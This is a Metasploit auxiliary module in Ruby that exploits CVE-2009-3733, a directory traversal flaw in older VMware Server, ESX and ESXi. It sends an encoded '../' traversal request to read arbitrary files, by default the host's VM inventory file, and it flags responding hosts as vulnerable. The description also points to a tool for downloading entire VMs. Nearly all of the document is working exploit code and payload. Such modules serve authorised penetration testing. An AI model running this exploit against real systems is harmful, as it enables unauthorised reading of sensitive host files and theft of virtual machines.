##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  # Exploit mixins should be called first
  include Msf::Exploit::Remote::HttpClient
  # Scanner mixin should be near last
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name' => 'VMware Server Directory Traversal Vulnerability',
      'Description' => 'This modules exploits the VMware Server Directory Traversal
        vulnerability in VMware Server 1.x before 1.0.10 build 203137 and 2.x before
        2.0.2 build 203138 on Linux, VMware ESXi 3.5, and VMware ESX 3.0.3 and 3.5
        allows remote attackers to read arbitrary files. Common VMware server ports
        80/8222 and 443/8333 SSL.  If you want to download the entire VM, check out
        the gueststealer tool.',
      'Author' => 'CG',
      'License' => MSF_LICENSE,
      'References' => [
        [ 'URL', 'https://www.vmware.com/security/advisories/VMSA-2009-0015.html' ],
        [ 'OSVDB', '59440' ],
        [ 'BID', '36842' ],
        [ 'CVE', '2009-3733' ],
        [ 'URL', 'http://fyrmassociates.com/tools/gueststealer-v1.1.pl' ]
      ],
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [IOC_IN_LOGS],
        'Reliability' => []
      }
    )
    register_options(
      [
        Opt::RPORT(8222),
        OptString.new('FILE', [ true, 'The file to view', '/etc/vmware/hostd/vmInventory.xml']),
        OptString.new('TRAV', [ true, 'Traversal Depth', '/sdk/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E']),
      ]
    )
  end

  def run_host(target_host)
    file = datastore['FILE']
    trav = datastore['TRAV']
    res = send_request_raw({
      'uri' => trav + file,
      'version' => '1.1',
      'method' => 'GET'
    }, 25)

    if res.nil?
      print_error('Connection timed out')
      return
    end

    if res.code != 200
      vprint_status("Received #{res.code} for #{trav}#{file}")
      return
    end

    # print_status("Output Of Requested File:\n#{res.body}")
    print_good("#{target_host}:#{rport} appears vulnerable to VMware Directory Traversal Vulnerability")
    report_vuln(
      {
        host: target_host,
        port: rport,
        proto: 'tcp',
        name: name,
        info: "Module #{fullname} reports directory traversal of #{target_host}:#{rport} with response code #{res.code}",
        refs: references,
        exploited_at: Time.now.utc
      }
    )
  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
    print_error(e.message)
  rescue ::Timeout::Error, ::Errno::EPIPE => e
    vprint_error(e.message)
  end
end
